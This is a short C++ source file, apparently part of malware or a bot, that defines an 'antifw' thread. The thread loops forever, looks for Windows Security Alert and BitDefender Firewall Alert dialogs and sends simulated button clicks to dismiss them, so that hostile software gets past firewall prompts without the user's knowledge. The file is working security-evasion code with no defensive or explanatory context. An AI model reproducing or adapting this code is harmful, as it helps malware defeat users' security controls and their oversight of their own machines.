#include "../h/includes.h"

DWORD WINAPI antifw(LPVOID)
{
	HWND fwWindow;

    while(true)
    {
		fwWindow = 0;

        if(fwWindow = FindWindow(0, "Windows Security Alert"))
        {
            SendMessage(fwWindow, WM_COMMAND, MAKEWORD(104,BN_CLICKED ), 0);
            while(IsWindow(fwWindow)) Sleep(50);
        }
        else if(fwWindow = FindWindow(0, "BitDefender Firewall Alert"))
        {

            SendMessage(fwWindow, WM_COMMAND, MAKEWORD(13133, BN_CLICKED ), 0);
            SendMessage(fwWindow, WM_COMMAND, MAKEWORD(IDOK,BN_CLICKED ), 0);
            while(IsWindow(fwWindow)) Sleep(50);
        }

        Sleep(30);
    }

    return 0;
}